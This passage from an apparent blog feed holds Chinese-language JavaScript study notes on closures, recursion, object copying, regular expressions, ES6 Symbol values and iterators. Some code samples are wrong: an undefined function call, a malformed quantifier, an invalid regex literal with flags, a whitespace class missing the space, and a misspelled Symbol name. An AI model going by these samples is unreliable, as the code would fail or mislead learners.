<li><font color="#f54747">延長變量的作用範圍</font>，因為後面有別的函數要調用此變量  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> num = <span class="number">10</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(num)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 實現 fn 外部的作用域訪問 fn 內部的局部變量</span></span><br><span class="line"><span class="keyword">var</span> f = <span class="title function_">fun</span>()</span><br><span class="line"><span class="title function_">f</span>()</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>閉包的應用：</p>
<ul>
<li><p>案例一、點擊獲取索引號</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1. 動態添加方式</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; lis.<span class="property">length</span>; i++)&#123;</span><br><span class="line">    lis[i].<span class="property">index</span> = i</span><br><span class="line">    lis[i].<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">index</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 閉包方式</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; lis.<span class="property">length</span>; i++)&#123;</span><br><span class="line">    <span class="comment">// 立即執行函數也稱為一個小閉包，因為立即執行函數裡面任何一個函數都可以使用它的i變量</span></span><br><span class="line">    (<span class="keyword">function</span>(<span class="params">i</span>)&#123;</span><br><span class="line">        lis[i].<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)(i)</span><br></pre></td></tr></table></figure>
</li>
<li><p>案例二、3秒後打印元素內容</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; lis.<span class="property">length</span>; i++)&#123;</span><br><span class="line">    (<span class="keyword">function</span>(<span class="params">i</span>)&#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(lis[i].<span class="property">innerHTML</span>);</span><br><span class="line">        &#125;, <span class="number">3000</span>);</span><br><span class="line">    &#125;)(i)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="遞歸Recursion"><a href="#遞歸Recursion" class="headerlink" title="遞歸Recursion"></a>遞歸Recursion</h2><ol>
<li><p>簡介：</p>
<ul>
<li>一個函數在內部可以調用其本身，這個函數就稱為遞歸函數</li>
<li>由於遞歸很容易發生「棧溢出」錯誤(stack overflow)，所以必須要加<font color="#f54747">退出條件return</font></li>
</ul>
</li>
<li><p>遞歸應用：</p>
<ul>
<li><p>應用一、階乘 Factorial</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">factorial</span>(<span class="params">n</span>)&#123;</span><br><span class="line">    <span class="keyword">switch</span>(n)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="attr">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">factorial</span>(n - <span class="number">1</span>) * n</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>應用二、斐波那契數列 Fibonacci</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fibonacci</span>(<span class="params">n</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(n == <span class="number">1</span> || n == <span class="number">2</span>) <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">fibonacci</span>(n-<span class="number">1</span>) + <span class="title function_">fibonacci</span>(n-<span class="number">2</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="對象拷貝"><a href="#對象拷貝" class="headerlink" title="對象拷貝"></a>對象拷貝</h2><ol>
<li><p>淺拷貝 Shallow Copy</p>
<ul>
<li>淺拷貝只是拷貝一層，更深層次對象級別只拷貝地址值</li>
<li>圖示：  <img src="https://p.ipic.vip/v7v66h.png" width="600px"/></li>
<li>ES6實現淺拷貝方法：<ul>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 參數一、target: 賦予給誰</span></span><br><span class="line"><span class="comment">// 參數二、source: 要拷貝的對象</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">assign</span>(target, source)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
<li><p>深拷貝 Deep Copy</p>
<ul>
<li>深拷貝就是拷貝多層，每一層的數據都會拷貝</li>
<li>圖示：  <img src="https://p.ipic.vip/s72c3s.png" width="600px"/></li>
<li>實現方式：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">deepCopy</span>(<span class="params">newObj, oldObj</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> k <span class="keyword">in</span> oldObj)&#123;</span><br><span class="line">        <span class="keyword">var</span> item = oldObj[k]</span><br><span class="line">        <span class="comment">// 由於Array也屬於Object，因此需要在Object之前篩選出去</span></span><br><span class="line">        <span class="keyword">if</span>(item <span class="keyword">instanceof</span> <span class="title class_">Array</span>)&#123;</span><br><span class="line">            newObj[k] = []</span><br><span class="line">            <span class="title function_">deepCopy</span>(newObj[k], item)</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(item <span class="keyword">instanceof</span> <span class="title class_">Object</span>)&#123;</span><br><span class="line">            newObj[k] = &#123;&#125;</span><br><span class="line">            <span class="title function_">deepCopy</span>(newObj[k], item)</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            newObj[k] = item</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>Web FrontEnd</category>
      </categories>
      <tags>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript - Regular Expression</title>
    <url>/myBlog/2022/07/22/2022/FrontEnd/2022-7-22-JS-RegularExpression/</url>
    <content><![CDATA[<h2 id="正則表達式的概述"><a href="#正則表達式的概述" class="headerlink" title="正則表達式的概述"></a>正則表達式的概述</h2><ol>
<li><p>簡介：</p>
<ul>
<li>正則表達式 (Regular Expression) 是用於匹配字符串中自字符組合的模式</li>
<li>在JavaScript中，正則表達式是一個對象</li>
</ul>
</li>
<li><p>作用：</p>
<ul>
<li>用於檢索、替換那些符合某個規則的文本<ol>
<li>匹配：<ul>
<li>例如用戶名只能輸入英文字、數字或者下劃線（<font color="#f54747">匹配</font>）</li>
</ul>
</li>
<li>替換：<ul>
<li>過濾掉頁面內容中的一些敏感詞</li>
</ul>
</li>
<li>提取：<ul>
<li>從字符串中獲取想要的特定部分</li>
</ul>
</li>
</ol>
</li>
</ul>
</li>
<li><p>特點：</p>
<ol>
<li>靈活性、邏輯性和功能性非常強</li>
<li>可以迅速地用極簡單的方式達到字符串的複雜控制</li>
<li>對於剛接觸的人而言比較難懂</li>
<li>在實際開發中，一般都是直接複製寫好的正則表達式，但是要求會使用正則表達式，並且根據實際情況修改正則表達式<ul>
<li>比如用戶名：<code>/^[a-z0-9_-](3-16)$</code></li>
</ul>
</li>
</ol>
</li>
</ol>
<h2 id="正則表達式的使用"><a href="#正則表達式的使用" class="headerlink" title="正則表達式的使用"></a>正則表達式的使用</h2><ol>
<li><p>創建正則表達式</p>
<ol>
<li><p>通過調用<code>RegExp</code>對象的構造函數創建</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> 變量名 = <span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="regexp">/表達式/</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>利用字面量創建</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> 變量名 = <span class="regexp">/表達式/</span></span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>測試正則表達式</p>
<ul>
<li>用於檢測字符串是否符合該規則</li>
<li>如果符合規則，則返回<code>true</code></li>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// regexObj - 正則表達式</span></span><br><span class="line"><span class="comment">// str - 要測試的文本</span></span><br><span class="line">regexObj.<span class="title function_">test</span>(str)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="常用特殊字符"><a href="#常用特殊字符" class="headerlink" title="常用特殊字符"></a>常用特殊字符</h2><h3 id="邊界符"><a href="#邊界符" class="headerlink" title="邊界符"></a>邊界符</h3><ol>
<li><p><code>^</code> - 表示匹配行首的文本（以什麼開始）</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/^abc/      <span class="comment">// 表示必須以 abc 為開頭</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>$</code> - 表示匹配行尾的文本（以什麼結束）</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/abc$/      <span class="comment">// 表示必須以 abc 為結尾</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="字符類"><a href="#字符類" class="headerlink" title="字符類"></a>字符類</h3><ol>
<li><p><code>[]</code> - 表示有一系列字符可供選擇，只要匹配其中一個就可以</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/[abc]/     <span class="comment">// 表示必須包含 a 或 b 或 c 其中一個</span></span><br><span class="line"><span class="regexp">/^[abc]$/</span></span><br></pre></td></tr></table></figure>

</li>
<li><p><code>[-]</code> - 表示內部範圍符</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/[a-z]/     <span class="comment">// 表示必須包含 a-z 的其中一個</span></span><br><span class="line"><span class="regexp">/[a-zA-Z0-9]/</span></span><br></pre></td></tr></table></figure>

</li>
<li><p><code>[^]</code> - 表示取反，<font color="#f54747">千萬與邊界符混淆</font></p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/[^a-z]/    <span class="comment">// 表示不能包含 a-z 的其中一個</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="量詞符"><a href="#量詞符" class="headerlink" title="量詞符"></a>量詞符</h3><ol>
<li><p><code>*</code> - 表示重複<font color="skyblue">零次或更多次 (<code>&gt;=0</code>)</font></p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/a*<span class="regexp">/    /</span><span class="regexp">/ 表示允許出現零次或以上</span></span><br></pre></td></tr></table></figure>

</li>
<li><p><code>+</code> - 表示重複<font color="skyblue">一次或更多次 (<code>&gt;=1</code>)</font></p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/a+<span class="regexp">/    /</span><span class="regexp">/ 表示允許出現一次或以上</span></span><br></pre></td></tr></table></figure>

</li>
<li><p><code>?</code> - 表示重複<font color="skyblue">零次或一次 (<code>0||1</code>)</font></p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/a?<span class="regexp">/    /</span><span class="regexp">/ 表示只允許出現零或一次</span></span><br></pre></td></tr></table></figure>

</li>
<li><p><code>&#123;n&#125;</code> - 表示重複<font color="skyblue">n次 (<code>=n</code>)</font></p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/a&#123;<span class="number">3</span>&#125;/  <span class="comment">// 表示必須包含三個 a</span></span><br></pre></td></tr></table></figure>

</li>
<li><p><code>&#123;n,&#125;</code> - 表示重複<font color="skyblue">n次或更多次 (<code>&gt;=n</code>)</font></p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/a&#123;<span class="number">3</span>,&#125;/  <span class="comment">// 表示必須包含三個以上 a</span></span><br></pre></td></tr></table></figure>

</li>
<li><p><code>&#123;n,m&#125;</code> - 表示重複<font color="skyblue">n到m次 (<code>&gt;=n &amp;&amp; &lt;=m&gt;</code>)</font></p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/a&#123;<span class="number">3</span>,<span class="number">6</span>&#125;/  <span class="comment">// 表示必須包含三個到六個 a</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="括號符"><a href="#括號符" class="headerlink" title="括號符"></a>括號符</h3><ol>
<li><p><code>[]</code> - 表示字符合集，匹配方括號中的任意字符</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/[abc]/     <span class="comment">// 表示必須包含 a 或 b 或 c 其中一個</span></span><br></pre></td></tr></table></figure>

</li>
<li><p><code>&#123;&#125;</code> - 表示量詞符，裡面表示重複的次數</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/^abc&#123;<span class="number">3</span>&#125;$/  <span class="comment">// 表示必須重複三次 c</span></span><br></pre></td></tr></table></figure>

</li>
<li><p><code>()</code> - 表示優先級</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/^(abc)&#123;<span class="number">3</span>&#125;$/     <span class="comment">// 表示必須重複三次 abc</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="預定義類"><a href="#預定義類" class="headerlink" title="預定義類"></a>預定義類</h3><ol>
<li><p><code>\d</code> - 表示匹配<font color="skyblue"> 0-9 </font>間的任一數字 (<code>[0-9]</code>)</p>
</li>
<li><p><code>\D</code> - 表示匹配<font color="skyblue"> 0-9 </font><font color="#f54747">以外</font>的字符 (<code>[^0-9]</code>)</p>
</li>
<li><p><code>\w</code> - 表示匹配<font color="skyblue">任意的字母、數字和下劃線</font> (<code>[a-zA-Z0-9_]</code>)</p>
</li>
<li><p><code>\W</code> - 表示匹配<font color="skyblue">除字母、數字和下劃線</font><font color="#f54747">以外</font>的字符 (<code>[^a-zA-Z0-9_]</code>)</p>
</li>
<li><p><code>\s</code> - 表示匹配<font color="skyblue">空格字符（包括換行符、制表符、空格符等）</font> (<code>[\t\r\n\v\f]</code>)</p>
</li>
<li><p><code>\S</code> - 表示匹配<font color="skyblue">非空格字符</font> (<code>[^\t\r\n\v\f]</code>)</p>
</li>
</ol>
<h2 id="字符一覽"><a href="#字符一覽" class="headerlink" title="字符一覽"></a>字符一覽</h2><table>
<thead>
<tr>
<th align="center">特殊字符</th>
<th align="center">說明</th>
<th align="center">例子</th>
</tr>
</thead>
<tbody><tr>
<td align="center">邊界符</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"><code>^</code></td>
<td align="center">表示匹配行首的文本（以什麼開始）</td>
<td align="center"><code>/^abc/</code></td>
</tr>
<tr>
<td align="center"><code>$</code></td>
<td align="center">表示匹配行尾的文本（以什麼結束）</td>
<td align="center"><code>/abc$/</code></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">字符類</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"><code>[ ]</code></td>
<td align="center">表示字符合集，匹配方括號中的任意字符</td>
<td align="center"><code>/[abc]/</code></td>
</tr>
<tr>
<td align="center"><code>[-]</code></td>
<td align="center">表示內部範圍</td>
<td align="center"><code>/[0-9]/</code></td>
</tr>
<tr>
<td align="center"><code>[^]</code></td>
<td align="center">表示取反</td>
<td align="center"><code>/[^0-9]/</code></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">量詞符</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"><code>*</code></td>
<td align="center">允許重複零次或以上</td>
<td align="center"><code>/^a*$/</code></td>
</tr>
<tr>
<td align="center"><code>+</code></td>
<td align="center">允許重複一次或以上</td>
<td align="center"><code>/^a+$/</code></td>
</tr>
<tr>
<td align="center"><code>?</code></td>
<td align="center">允許重複零次或一次</td>
<td align="center"><code>/^a?$/</code></td>
</tr>
<tr>
<td align="center"><code>&#123;n&#125;</code></td>
<td align="center">允許重複n次</td>
<td align="center"><code>/^a&#123;3&#125;$/</code></td>
</tr>
<tr>
<td align="center"><code>&#123;n,&#125;</code></td>
<td align="center">允許重複n次或以上</td>
<td align="center"><code>/^a&#123;3,&#125;$/</code></td>
</tr>
<tr>
<td align="center"><code>&#123;n,m&#125;</code></td>
<td align="center">允許重複n次到m次</td>
<td align="center"><code>/^a&#123;3,6&#125;$/</code></td>
</tr>
<tr>
<td align="center"><code>()</code></td>
<td align="center">表示優先級別</td>
<td align="center"><code>/^(abc)&#123;3&#125;$/</code></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">預定義類</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"><code>\d</code></td>
<td align="center">匹配 0-9 之間任意數字</td>
<td align="center"><code>/\d&#123;3&#125;/</code></td>
</tr>
<tr>
<td align="center"><code>\D</code></td>
<td align="center">匹配 0-9 以外任意數字</td>
<td align="center"><code>/\D&#123;3&#125;/</code></td>
</tr>
<tr>
<td align="center"><code>\w</code></td>
<td align="center">表示匹配任意的字母、數字和下劃線</td>
<td align="center"><code>/\w&#123;3&#125;/</code></td>
</tr>
<tr>
<td align="center"><code>\W</code></td>
<td align="center">表示匹配字母、數字和下劃線以外的字符</td>
<td align="center"><code>/\W&#123;3&#125;/</code></td>
</tr>
<tr>
<td align="center"><code>\s</code></td>
<td align="center">表示匹配空格字符</td>
<td align="center"><code>/\s&#123;3&#125;/</code></td>
</tr>
<tr>
<td align="center"><code>\S</code></td>
<td align="center">表示匹配非空格字符</td>
<td align="center"><code>/\S&#123;3&#125;/</code></td>
</tr>
</tbody></table>
<h2 id="正則替換"><a href="#正則替換" class="headerlink" title="正則替換"></a>正則替換</h2><ol>
<li><p><code>replace</code>方法</p>
<ul>
<li>使用<code>replace()</code>方法可以實現替換字符串操作，用來替換的參數是一個字符串或是一個正則表達式</li>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 參數一、regexp: 要替換的正則表達式</span></span><br><span class="line"><span class="comment">// 參數二、replacement: 要替換的內容</span></span><br><span class="line">stringObject.<span class="title function_">replace</span>(regexp/substr, replacement)</span><br></pre></td></tr></table></figure></li>
<li>問題：<ol>
<li>只能替換內容中第一個字符組合</li>
</ol>
</li>
</ul>
</li>
<li><p>正則表達式參數</p>
<ul>
<li><p>正則表達式中也可以傳遞參數</p>
</li>
<li><p>語法：</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// switch: 修飾符</span></span><br><span class="line">/regexp/<span class="keyword">switch</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>switch</code>修飾符的三種值：</p>
<ol>
<li><code>g</code> - 全局匹配</li>
<li><code>i</code> - 忽略大小寫</li>
<li><code>gi</code> - 全局匹配和忽略大小寫</li>
</ol>
</li>
<li><p>具體編碼：</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">text.<span class="property">value</span>.<span class="title function_">replace</span>(<span class="string">&#x27;/fuck|bitch/&#x27;</span>gi, <span class="string">&#x27;**&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>Web FrontEnd</category>
      </categories>
      <tags>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript - ES6 Data Types</title>
    <url>/myBlog/2022/07/25/2022/FrontEnd/2022-7-25-JS-ES6DataTypes/</url>
    <content><![CDATA[<h2 id="Symbol-數據類型"><a href="#Symbol-數據類型" class="headerlink" title="Symbol 數據類型"></a>Symbol 數據類型</h2><ol>
<li><p>簡介：</p>
<ul>
<li>ES6 引入一種新的原始數據類型 Symbol ，表示獨一無二值</li>
<li>它是 JavaScript 的第七種數據類型，是一種類似於字符串的數據類型</li>
<li>用於給對象添加屬性和方法</li>
</ul>
</li>
<li><p>特點：</p>
<ol>
<li>Symbol 的值是唯一的，用來解決命名衝突問題</li>
<li>Symbol 的值不能與其他數據進行運算</li>
<li>Symbol 定義的對象屬性不能使用<code>for in</code>循環遍歷，但是可以使用<code>Reflect.ownKeys</code>來獲取對象的所有<code>key</code></li>
</ol>
</li>
</ol>
<h3 id="Symbol基本使用"><a href="#Symbol基本使用" class="headerlink" title="Symbol基本使用"></a>Symbol基本使用</h3><ol>
<li><p>創建：</p>
<ol>
<li><p>方式一：使用<code>Symbol()</code>創建</p>
<ul>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> s = <span class="title class_">Symbol</span>()</span><br></pre></td></tr></table></figure></li>
<li>可傳遞一個字符串作為描述字符串，通過字面意思來理解值（注釋）</li>
<li>描述字符串只是一個標誌，返回的值並不相同  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> s1 = <span class="title class_">Symbol</span>(<span class="string">&#x27;Hello&#x27;</span>)</span><br><span class="line"><span class="keyword">let</span> s2 = <span class="title class_">Symbol</span>(<span class="string">&#x27;Hello&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(s1 === s2)      <span class="comment">// false</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>方式二、使用<code>Symbol.for()</code>創建</p>
<ul>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> s = <span class="title class_">Symbol</span>.<span class="title function_">for</span>()</span><br></pre></td></tr></table></figure></li>
<li>一樣可以傳遞描述字符串</li>
<li>而這種方式可以通過此描述字符串來得出唯一<code>Symbol</code>值  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> s1 = <span class="title class_">Symbol</span>.<span class="title function_">for</span>(<span class="string">&#x27;Hello&#x27;</span>)</span><br><span class="line"><span class="keyword">let</span> s2 = <span class="title class_">Symbol</span>.<span class="title function_">for</span>(<span class="string">&#x27;Hello&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(s1 === s2)      <span class="comment">// true</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
</li>
<li><p>給對象添加方法</p>
<ol>
<li><p>在對象外添加方法</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> game = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> left = <span class="title class_">Symbol</span>(<span class="string">&#x27;left&#x27;</span>)</span><br><span class="line"><span class="keyword">let</span> methods = &#123;</span><br><span class="line">    <span class="attr">right</span>: <span class="title class_">Symbol</span>(<span class="string">&#x27;right&#x27;</span>),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">game[left] = <span class="keyword">function</span>(<span class="params"></span>)&#123; ... &#125;</span><br><span class="line">game[methods.<span class="property">right</span>] = <span class="keyword">function</span>(<span class="params"></span>)&#123; ... &#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>在對象內添加方法</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> game = &#123;</span><br><span class="line">    [<span class="title class_">Symbol</span>(<span class="string">&#x27;left&#x27;</span>)]: <span class="keyword">function</span>(<span class="params"></span>)&#123; ... &#125;,</span><br><span class="line">    [<span class="title class_">Symbol</span>(<span class="string">&#x27;right&#x27;</span>)]: <span class="keyword">function</span>(<span class="params"></span>)&#123; ... &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ol>
<h3 id="Symbol內置值"><a href="#Symbol內置值" class="headerlink" title="Symbol內置值"></a>Symbol內置值</h3><p>除了定義自己使用的<code>Symbol</code>值以外，ES6 提供了11個內置Symbol值，指向語言內部使用的方法</p>
<table>
<thead>
<tr>
<th>方法</th>
<th>說明</th>
</tr>
</thead>
<tbody><tr>
<td><code>Symbol.hasInstance</code></td>
<td>當其他對象使用<code>instanceof</code>運算符，判斷是否為該對象的實例時，會調用這個方法</td>
</tr>
<tr>
<td><code>Symbol.isConcatSpreadable</code></td>
<td>是一個布爾值，表示該對象用於<code>Array.prototype.concat()</code>時，是否可以展開</td>
</tr>
<tr>
<td><code>Symbol.unscopables</code></td>
<td>該對象指定了使用<code>with</code>關鍵字時，哪些屬性會被<code>with</code>環境排除</td>
</tr>
<tr>
<td><code>Symbol.match</code></td>
<td>執行<code>str.match(obj)</code>時，如果該屬性存在，會調用它，返回該方法的返回值</td>
</tr>
<tr>
<td><code>Symbol.replace</code></td>
<td>當該對象被<code>str.replace(obj)</code>方法調用時，會返回該方法的返回值</td>
</tr>
<tr>
<td><code>Symbol.search</code></td>
<td>當該對象被<code>str.search(obj)</code>方法調用時，會返回該方法的返回值</td>
</tr>
<tr>
<td><code>Symbol.split</code></td>
<td>當該對象被<code>str.split(obj)</code>方法調用時，會返回該方法的返回值</td>
</tr>
<tr>
<td><code>Symbol.interator</code></td>
<td>對象進行<code>for...of</code>循環時，會調用這個方法，返回該對象的默認遍歷器</td>
</tr>
<tr>
<td><code>Symbol.toPrimitive</code></td>
<td>該對象被轉為原始類型的值時，會調用這個方法，返回該對象對應的原始類型值</td>
</tr>
<tr>
<td><code>Symbol.toStringTag</code></td>
<td>在該對象上面調用<code>toString</code>方法時，返回該方法的返回值</td>
</tr>
<tr>
<td><code>Symbol.species</code></td>
<td>創建衍生對象時，會使用該方法</td>
</tr>
</tbody></table>
<h2 id="迭代器-Iterator"><a href="#迭代器-Iterator" class="headerlink" title="迭代器 Iterator"></a>迭代器 Iterator</h2><ol>
<li><p>簡介：</p>
<ul>
<li>迭代器是一種接口，為各種不同的數據類型提供統一的訪問機制</li>
<li>任何數據結構只要部署迭代器接口，就可以完成遍歷操作</li>
<li>ES6 創造了一種新的遍歷命令<code>for...of</code>循環，迭代器接口主要供<code>for...of</code>消費</li>
<li>原生具備迭代器接口的數據（即可用<code>for...of</code>遍歷）<br>  <code>Array</code>, <code>Arguments</code>, <code>Set</code>, <code>Map</code>, <code>String</code>, <code>TypedArray</code>, <code>NodeList</code></li>
</ul>
</li>
<li><p>工作原理：</p>
<ol>
<li>創建一個指針對象，指向當前數據結構的起始位置</li>
<li>第一次調用對象的<code>next</code>方法（返回對象身上的<code>next</code>方法），指針會自動指向數據結構的第一個成員</li>
<li>接下來不斷調用<code>next</code>方法，指針一直往後移動，直到指向最後一個成員</li>
<li>每調用<code>next</code>方法返回一個包含<code>value</code>和<code>done</code>屬性的對象</li>
</ol>
<ul>
<li><font color="#f54747">注：需要自定義遍歷數據時，要想到迭代器</font></li>
</ul>
</li>
<li><p>實際應用：</p>
<ul>
<li>自定義迭代器，能給對象自定義一套<code>for...of</code>的遍歷規則</li>
<li>具體代碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> school = &#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&#x27;CUHK&#x27;</span>,</span><br><span class="line">    <span class="attr">students</span>:[<span class="string">&#x27;Donald&#x27;</span>, <span class="string">&#x27;John&#x27;</span>, <span class="string">&#x27;May&#x27;</span>, <span class="string">&#x27;Lily&#x27;</span>],</span><br><span class="line">    <span class="comment">// 1. 為對象配置迭代器</span></span><br><span class="line">    [<span class="title class_">Symbol</span>.<span class="property">iterator</span>]()&#123;</span><br><span class="line">        <span class="keyword">let</span> index = <span class="number">0</span></span><br><span class="line">        <span class="comment">// 2. 迭代器返回值是一個包含 next 方法的對象</span></span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="comment">// 3. 配置對象的 next 方法</span></span><br><span class="line">            <span class="attr">next</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(index &lt; <span class="variable language_">this</span>.<span class="property">students</span>.<span class="property">length</span>)&#123;</span><br><span class="line">                    <span class="comment">// 4. next 方法返回值為一個包含 value 和 done 值的對象</span></span><br><span class="line">                    <span class="keyword">const</span> result = &#123;<span class="attr">value</span>: <span class="variable language_">this</span>.<span class="property">students</span>[index++], <span class="attr">done</span>: <span class="literal">false</span>&#125;</span><br><span class="line">                    <span class="keyword">return</span> result</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> &#123;<span class="attr">value</span>: <span class="literal">undefined</span>, <span class="attr">done</span>: <span class="literal">true</span>&#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>這種遍歷形式符合面向對象概念，不直接調用對象身上的數組進行遍歷，而是透過聯繫對象自身方法遍歷數組</li>
</ul>
</li>
</ol>
<h2 id="生成器-Generator"><a href="#生成器-Generator" class="headerlink" title="生成器 Generator"></a>生成器 Generator</h2><ol>
<li><p>簡介：</p>
<ul>
<li>生成器函數是 ES6 提供的一種異步編程解決方案</li>
<li>語法行為與傳統函數完全不同</li>
</ul>
</li>
<li><p>使用方法：</p>
<ol>
